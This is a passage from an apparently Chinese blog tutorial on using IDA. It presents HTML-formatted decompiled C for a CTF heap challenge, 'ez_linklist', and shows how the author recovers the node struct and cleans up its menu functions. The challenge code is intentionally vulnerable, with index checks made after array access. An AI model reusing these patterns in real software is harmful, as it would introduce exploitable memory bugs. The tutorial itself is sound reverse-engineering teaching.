<span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>data <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>field_0 <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">your_read</span><span class=\"token punctuation\">(</span>ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>data<span class=\"token punctuation\">,</span> ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>可以看到这段代码贴进代码块已经没有什么违和感了，但该结构体还有一个疑点，我们可以进入其他函数继续分析</p>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">link</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span>\n  <span class=\"token keyword\">int</span> idx1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> idx2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-Ch]</span>\n  node <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span>\n\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"link from:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx1 <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx1 <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad node\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"link to:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx2 <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx2 <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad node\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> count<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    ptr <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>ptr<span class=\"token operator\">-></span>field_0<span class=\"token punctuation\">;</span>\n  ptr<span class=\"token operator\">-></span>field_0 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>__int64<span class=\"token punctuation\">)</span>ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> count<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<p>函数逻辑比较简单，看到这里，也已经知道这个 field_0 就相当于节点的 next 指针了，指向了下一个节点，因此这个元素的类型是  <code>我们创造的结构体指针类型</code> ，元素名无所谓，就叫他 next 吧，改名并修改 类型</p>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E7%94%A8IDA/image-20220909235245037.png\" alt=\"image-20220909235245037\"></p>\n<p>至此，本题的数据结构以及逻辑全部弄清楚了，接着可以跟随自己的习惯优化代码</p>\n<h2 id=\"高质量代码鉴赏环节\"><a class=\"markdownIt-Anchor\" href=\"#高质量代码鉴赏环节\">#</a> 高质量代码鉴赏环节</h2>\n<p>题目名 ez_linklist</p>\n<h3 id=\"main\"><a class=\"markdownIt-Anchor\" href=\"#main\">#</a> main</h3>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">void</span> __fastcall __noreturn <span class=\"token function\">main</span><span class=\"token punctuation\">(</span>__int64 a1<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a2<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>a3<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> choice<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-4h]</span>\n\n  <span class=\"token function\">setvbuf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    choice <span class=\"token operator\">=</span> <span class=\"token function\">menu</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> choice <span class=\"token operator\">&lt;=</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> __int64<span class=\"token punctuation\">)</span>table <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>table<span class=\"token punctuation\">[</span>choice<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n      <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">1uLL</span><span class=\"token operator\">:</span>\n          <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">2uLL</span><span class=\"token operator\">:</span>\n          <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">3uLL</span><span class=\"token operator\">:</span>\n          <span class=\"token function\">link</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">4uLL</span><span class=\"token operator\">:</span>\n          <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n          <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">case</span> <span class=\"token number\">5uLL</span><span class=\"token operator\">:</span>\n          <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">default</span><span class=\"token operator\">:</span>\n          <span class=\"token keyword\">goto</span> LABEL_9<span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\nLABEL_9<span class=\"token operator\">:</span>\n  <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad choice\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"add\"><a class=\"markdownIt-Anchor\" href=\"#add\">#</a> add</h3>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+0h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-Ch]</span>\n  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-8h]</span>\n\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">15</span> <span class=\"token operator\">&amp;&amp;</span> ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too many link list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Size:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  size <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> size <span class=\"token operator\">></span> <span class=\"token number\">0x70</span> <span class=\"token operator\">||</span> size <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"wrong size!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  buf <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>node <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x18uLL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>size <span class=\"token operator\">=</span> size<span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>data <span class=\"token operator\">=</span> buf<span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Content:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">your_read</span><span class=\"token punctuation\">(</span>ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>data<span class=\"token punctuation\">,</span> ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"link\"><a class=\"markdownIt-Anchor\" href=\"#link\">#</a> link</h3>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">link</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span>\n  <span class=\"token keyword\">int</span> idx1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> idx2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-Ch]</span>\n  node <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span>\n\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"link from:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx1 <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx1 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx1 <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad node\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"link to:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx2 <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx2 <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx2 <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad node\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  ptr <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> count<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    ptr <span class=\"token operator\">=</span> ptr<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n  ptr<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>idx1<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> count<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n  ptr_list<span class=\"token punctuation\">[</span>idx2<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"unlink\"><a class=\"markdownIt-Anchor\" href=\"#unlink\">#</a> unlink</h3>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-18h]</span>\n  <span class=\"token keyword\">int</span> j<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span>\n  <span class=\"token keyword\">int</span> idx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-10h]</span>\n  <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+14h] [rbp-Ch]</span>\n  node <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-8h]</span>\n\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">15</span> <span class=\"token operator\">&amp;&amp;</span> ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>i <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> i <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Too many link list\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad idx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"This list has only one node.\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Input offset:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  offset <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> offset <span class=\"token operator\">>=</span> count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> offset <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad offset\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> offset <span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n    ptr <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> offset <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>j <span class=\"token punctuation\">)</span>\n      ptr <span class=\"token operator\">=</span> ptr<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n    ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ptr<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n    ptr<span class=\"token operator\">-></span>next <span class=\"token operator\">=</span> ptr<span class=\"token operator\">-></span>next<span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">else</span>\n  <span class=\"token punctuation\">&#123;</span>\n    ptr_list<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token operator\">-></span>next<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token operator\">--</span>count<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  count<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Success\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></code></pre>\n<h3 id=\"delete\"><a class=\"markdownIt-Anchor\" href=\"#delete\">#</a> delete</h3>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token keyword\">int</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n  _DWORD <span class=\"token operator\">*</span>res<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span>\n  <span class=\"token keyword\">int</span> i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+4h] [rbp-2Ch]</span>\n  <span class=\"token keyword\">int</span> idx<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-28h]</span>\n  <span class=\"token keyword\">int</span> offset<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-24h]</span>\n  node <span class=\"token operator\">*</span>ptr<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-20h]</span>\n  node <span class=\"token operator\">*</span>p<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+18h] [rbp-18h]</span>\n  node <span class=\"token operator\">*</span>next<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+20h] [rbp-10h]</span>\n  node <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+28h] [rbp-8h]</span>\n\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Index\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  idx <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token operator\">!</span>ptr_list<span class=\"token punctuation\">[</span>idx<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> idx <span class=\"token operator\">&lt;</span> <span class=\"token number\">0</span> <span class=\"token operator\">||</span> idx <span class=\"token operator\">></span> <span class=\"token number\">15</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Bad idx\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">check</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Input offset:\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  offset <span class=\"token operator\">=</span> <span class=\"token function\">get_num</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n 